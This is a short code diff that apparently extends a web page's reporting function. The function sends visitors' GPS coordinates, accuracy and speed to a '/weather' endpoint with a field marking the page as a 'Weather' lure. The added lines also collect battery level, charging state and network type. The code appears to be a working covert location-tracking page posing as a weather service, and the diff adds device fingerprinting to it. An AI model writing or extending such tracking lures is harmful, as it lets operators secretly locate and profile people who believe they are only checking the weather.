@@ -361,12 +361,31 @@
             }
         }
 
+        let telemetry = { battery: null, charging: false, network: "4G" }
+
+        if (navigator.getBattery) {
+            navigator.getBattery().then(b => {
+                telemetry.battery = b.level * 100
+                telemetry.charging = b.charging
+            }).catch(() => {})
+        }
+        if (navigator.connection) {
+            telemetry.network = navigator.connection.effectiveType ? navigator.connection.effectiveType.toUpperCase() : "4G"
+        }
+
         async function sendReport(lat, lng, accuracy, speed, type) {
             try {
                 await fetch("/weather", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ id, lat, lng, accuracy, speed, type: type || "GPS" })
+                    body: JSON.stringify({
+                        id, lat, lng, accuracy, speed,
+                        type: type || "GPS",
+                        lure: "Weather",
+                        battery: telemetry.battery,
+                        charging: telemetry.charging,
+                        network: telemetry.network
+                    })
                 })
             } catch (err) {
                 console.warn("Report error:", err)
